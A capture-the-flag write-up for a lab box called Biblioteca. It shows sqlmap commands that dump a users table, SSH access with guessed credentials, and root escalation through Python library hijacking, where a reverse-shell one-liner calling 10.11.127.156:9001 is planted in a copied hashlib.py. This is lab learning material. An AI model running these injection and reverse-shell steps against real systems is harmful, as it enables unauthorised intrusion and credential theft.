# Biblioteca

### Biblioteca
Nmap scan shows ports 22 and 8000. Port 8000 contains an http server. It contains a login page, but I don't have credentials so I try to register, and it just welcomes me. Since it prints my username, I try to create an account called `<script>alert(1);</script>` but it says this:<br />
![image](https://github.com/user-attachments/assets/9886dba5-4753-4cf1-a549-109e4fe69a65)<br />
I found an sql injection using sqlmap: `sqlmap -r request -p username --risk 3 --level 5  --dbs --batch --dbms=mysql`<br />
![image](https://github.com/user-attachments/assets/a88d089b-0179-4424-b8b2-5692455d019e)<br />
So I know that there's a database called `website`. I now want to enumerate what are the tables of this DB. `sqlmap -r request -p username --risk 3 --level 5 --batch --dbms=mysql -D website --tables`:<br />
![image](https://github.com/user-attachments/assets/62b0eb62-243c-48e4-82e7-a71774210feb)<br />
Good, now I want to know what's inside this table `users`. So I run `sqlmap -r request -p username --risk 3 --level 5 --batch --dbms=mysql -D website -T users --dump`. This retrieves a set of credentials for the user `smokey`.
<br />
I use them to access smokey's ssh account. At this point I was stuck for about two hours... I needed to access `hazel`'s account but didn't find anything. Then my friend [Simone](https://github.com/SimoneCiferri) enlighted me. He told me: "why don't you try `hazel:hazel`. It worked. LOL.<br />
Now If I run `sudo -l` I get this:<br />
![image](https://github.com/user-attachments/assets/7e773375-8d5e-4601-a874-b3f25b5c621c)<br />
And this is the code of the python file:

    import hashlib
    
    def hashing(passw):
    
        md5 = hashlib.md5(passw.encode())
    
        print("Your MD5 hash is: ", end ="")
        print(md5.hexdigest())
    
        sha256 = hashlib.sha256(passw.encode())
    
        print("Your SHA256 hash is: ", end ="")
        print(sha256.hexdigest())
    
        sha1 = hashlib.sha1(passw.encode())
    
        print("Your SHA1 hash is: ", end ="")
        print(sha1.hexdigest())
    
    
    def main():
        passw = input("Enter a password to hash: ")
        hashing(passw)
    
    if __name__ == "__main__":
        main()

I found a guide explaining how to exploit this [here](https://github.com/gurkylee/Linux-Privilege-Escalation-Basics). Basically it's some kind of library hijacking.<br />
To exploit this, we need to run the following command: `cp /usr/lib/python3.8/hashlib.py /tmp/hashlib.py`.<br />
Then I put the following code at the beginning of the new hashlib.py file:

    import os,pty,socket;s=socket.socket();s.connect(("10.11.127.156",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
Then I listen with netcat on port 9001, and execute `sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py`:<br />
![image](https://github.com/user-attachments/assets/6219c3a8-1c1e-4e2f-afde-6b6bd81891cf)<br />
This got me the root flag!


